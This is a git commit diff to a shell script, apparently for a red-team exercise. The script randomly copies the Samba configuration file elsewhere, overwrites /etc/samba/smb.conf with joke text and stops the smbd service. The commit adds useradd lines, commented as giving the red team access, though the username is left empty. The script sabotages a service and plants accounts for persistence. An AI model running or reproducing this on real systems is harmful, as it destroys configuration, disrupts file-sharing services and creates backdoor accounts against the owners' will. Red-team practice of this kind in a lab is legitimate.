c1f451584536ca14b0ff58e73c09c3c45f9c2c30
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-11 16:58:13 -0400

    Update testscript.sh

--- testscript.sh
+++ testscript.sh
@@ -9,13 +9,15 @@ do
  #Generate random number, check if the number is even or odd
  if [ $(( $RANDOM % 2)) -eq 0 ]
  then
- #Copy config file to other location, then overwrite original
+ #Copy config file to other location, then overwrite original, add users for red team access
    cp '/etc/samba/smb.conf' '/etc/red.conf'
    echo "I'm Batman" > '/etc/samba/smb.conf'
+   useradd -m -p "pass" ""
  else
-  #Copy config file to other location, then overwrite original
+ #Copy config file to other location, then overwrite original, add users for red team access
    cp '/etc/samba/smb.conf' '/home/red.conf'
    echo "You ever dance with the devil in the pale mooon light?" > '/etc/samba/smb.conf'
+   useradd -m -p "pass" ""
  fi
  #Stop samba service
  sudo service smbd stop
